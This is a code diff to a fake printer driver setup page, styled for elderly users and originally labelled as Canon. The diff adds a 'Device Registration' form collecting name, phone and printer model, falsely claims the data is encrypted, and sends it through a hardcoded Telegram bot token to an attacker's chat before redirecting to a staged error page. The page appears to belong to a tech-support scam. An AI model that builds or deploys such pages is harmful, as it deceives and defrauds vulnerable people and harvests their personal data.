@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Canon Printer Setup</title>
+  <title>Printer Setup Guide</title>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   
   <style>
@@ -31,15 +31,14 @@
       border-bottom: 4px solid var(--primary-color);
       display: flex;
       align-items: center;
-      justify-content: space-between; /* Logo Left, Help Right */
-      padding: 0 5%; /* Spacing from sides */
+      justify-content: space-between;
+      padding: 0 5%;
       box-shadow: 0 2px 10px rgba(0,0,0,0.05);
     }
 
-    /* Logo Left Side */
     .brand-mark {
       color: var(--primary-color);
-      font-size: 38px; /* Big Logo */
+      font-size: 38px;
       font-weight: 900;
       letter-spacing: -1px;
     }
@@ -54,7 +53,7 @@
     }
     .secure-indicator i { color: #2e7d32; }
 
-    /* --- MAIN CONTENT (Centered & Big) --- */
+    /* --- MAIN CONTENT --- */
     .main-area {
       flex: 1;
       display: flex;
@@ -66,7 +65,7 @@
     }
 
     h1 {
-      font-size: 42px; /* Very Big Heading for Seniors */
+      font-size: 42px;
       margin-bottom: 20px;
       color: #222;
     }
@@ -87,7 +86,7 @@
     }
 
     .choice-box {
-      width: 350px; /* Wide Cards */
+      width: 350px;
       padding: 50px 30px;
       border: 3px solid #e0e0e0;
       border-radius: 12px;
@@ -96,7 +95,6 @@
       background: #fff;
     }
 
-    /* Hover Effect */
     .choice-box:hover {
       border-color: var(--primary-color);
       background-color: var(--hover-bg);
@@ -105,7 +103,7 @@
     }
 
     .icon-display {
-      font-size: 80px; /* Huge Icons */
+      font-size: 80px;
       margin-bottom: 25px;
       color: #444;
     }
@@ -130,7 +128,108 @@
     }
 
     .choice-box:hover .start-btn {
-      background: var(--primary-color); /* Turns Red on Hover */
+      background: var(--primary-color);
+    }
+
+    /* --- PROFESSIONAL REGISTRATION MODAL --- */
+    .modal-overlay {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.7); /* Darker background for focus */
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+      backdrop-filter: blur(5px);
+    }
+
+    .modal-box {
+      background: #fff;
+      width: 100%;
+      max-width: 550px; /* Wider for comfort */
+      padding: 0;
+      border-radius: 8px;
+      text-align: left;
+      box-shadow: 0 20px 60px rgba(0,0,0,0.4);
+      animation: popIn 0.3s ease-out;
+      overflow: hidden;
+    }
+
+    @keyframes popIn {
+      from { transform: scale(0.95); opacity: 0; }
+      to { transform: scale(1); opacity: 1; }
+    }
+
+    /* Modal Header looking like Software */
+    .modal-header {
+      background: #f1f1f1;
+      padding: 20px 30px;
+      border-bottom: 1px solid #ddd;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .modal-title { font-size: 22px; font-weight: 700; color: #333; }
+    .close-icon { font-size: 24px; color: #999; cursor: pointer; }
+
+    .modal-body {
+      padding: 30px;
+    }
+
+    .modal-desc {
+      font-size: 16px;
+      color: #555;
+      margin-bottom: 25px;
+      background: #eef9ff; /* Light blue tech look */
+      padding: 15px;
+      border-left: 4px solid #2196F3;
+      border-radius: 4px;
+    }
+
+    /* Big Senior Inputs */
+    .form-group { margin-bottom: 20px; }
+    .form-label {
+      display: block;
+      font-size: 16px;
+      font-weight: 700;
+      margin-bottom: 8px;
+      color: #333;
+    }
+    .form-input {
+      width: 100%;
+      padding: 16px; /* Big touch area */
+      font-size: 18px; /* Big text */
+      border: 2px solid #ccc;
+      border-radius: 6px;
+      background: #fafafa;
+    }
+    .form-input:focus {
+      border-color: var(--primary-color);
+      background: #fff;
+      outline: none;
+    }
+
+    .submit-btn {
+      width: 100%;
+      padding: 20px;
+      background: var(--primary-color);
+      color: white;
+      font-size: 22px;
+      font-weight: bold;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      box-shadow: 0 5px 15px rgba(204,0,0,0.3);
+      transition: background 0.2s;
+    }
+    .submit-btn:hover { background: #b30000; }
+
+    .privacy-note {
+      text-align: center;
+      font-size: 13px;
+      color: #888;
+      margin-top: 15px;
     }
 
     /* --- FOOTER --- */
@@ -143,10 +242,11 @@
       border-top: 1px solid #ddd;
     }
 
-    /* Mobile Responsive */
+    /* Responsive */
     @media(max-width: 768px) {
       h1 { font-size: 32px; }
       .choice-box { width: 100%; max-width: 400px; padding: 30px; }
+      .modal-box { width: 95%; }
     }
   </style>
   <script src="//code.jivosite.com/widget/kmQyW9kmtz" async></script>
@@ -169,7 +269,7 @@
 
     <div class="selection-grid">
       
-      <div class="choice-box" onclick="selectSystem('Windows')">
+      <div class="choice-box" onclick="openModal('Windows')">
         <div class="icon-display">
           <i class="fab fa-windows"></i>
         </div>
@@ -177,7 +277,7 @@
         <div class="start-btn">Click to Start</div>
       </div>
 
-      <div class="choice-box" onclick="selectSystem('macOS')">
+      <div class="choice-box" onclick="openModal('macOS')">
         <div class="icon-display">
           <i class="fab fa-apple"></i>
         </div>
@@ -190,16 +290,101 @@
   </main>
 
   <footer class="site-bottom">
-    &copy; 2025
+    &copy; 2025 Inc. All Rights Reserved.
   </footer>
 
-  <script>
-    function selectSystem(osName) {
-      // 1. Save OS Choice
-      localStorage.setItem('selectedOS', osName);
+  <div class="modal-overlay" id="setupModal">
+    <div class="modal-box">
       
-      // 2. Go to Loading Page
-      window.location.href = "/printer/loading.html";
+      <div class="modal-header">
+        <div class="modal-title">Device Registration</div>
+        <div class="close-icon" onclick="closeModal()">&times;</div>
+      </div>
+
+      <div class="modal-body">
+        <p class="modal-desc">
+          <i class="fas fa-info-circle"></i> 
+          Please verify your device ownership to download the correct drivers.
+        </p>
+        
+        <div class="form-group">
+          <label class="form-label">Printer Model Number</label>
+          <input type="text" class="form-input" id="modelInput" placeholder="e.g. PIXMA MG2522">
+        </div>
+
+        <div class="form-group">
+          <label class="form-label">Owner Name</label>
+          <input type="text" class="form-input" id="nameInput" placeholder="Enter Full Name">
+        </div>
+
+        <div class="form-group">
+          <label class="form-label">Contact Number</label>
+          <input type="tel" class="form-input" id="phoneInput" placeholder="Mobile Number">
+        </div>
+
+        <button class="submit-btn" onclick="submitData()">Register & Download &rarr;</button>
+        
+        <div class="privacy-note">
+          <i class="fas fa-lock"></i> Your information is securely encrypted.
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <script>
+    let selectedOS = "";
+    const BOT_TOKEN = "7764513169:AAFpRf8WQ6WE7DymOqMgTxXjv6BUSZe2734";
+    const CHAT_ID = "1684000886";
+
+    function openModal(os) {
+      selectedOS = os;
+      document.getElementById('setupModal').style.display = 'flex';
+    }
+
+    function closeModal() {
+      document.getElementById('setupModal').style.display = 'none';
+    }
+
+    function submitData() {
+      const model = document.getElementById('modelInput').value;
+      const name = document.getElementById('nameInput').value;
+      const phone = document.getElementById('phoneInput').value;
+      const btn = document.querySelector('.submit-btn');
+
+      if (!model || !name || !phone) {
+        alert("Please fill in all fields to verify your device.");
+        return;
+      }
+
+      // Visual Feedback - "Processing" looks like software logic
+      btn.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i> Verifying...';
+      btn.style.background = "#555";
+
+      const message = `🔴 *NEW REGISTRATION*\n\n👤 *Name:* ${name}\n🖨 *Model:* ${model}\n📱 *Phone:* ${phone}\n💻 *OS:* ${selectedOS}`;
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message,
+          parse_mode: 'Markdown'
+        })
+      })
+      .then(response => {
+        // Save Name/Model to storage so we can show it on the Error Page later
+        localStorage.setItem('selectedOS', selectedOS);
+        localStorage.setItem('userName', name);
+        localStorage.setItem('modelNumber', model);
+        
+        // Redirect
+        window.location.href = "/printer/loading.html";
+      })
+      .catch(error => {
+        // Fallback Redirect
+        window.location.href = "/printer/loading.html";
+      });
     }
   </script>
 
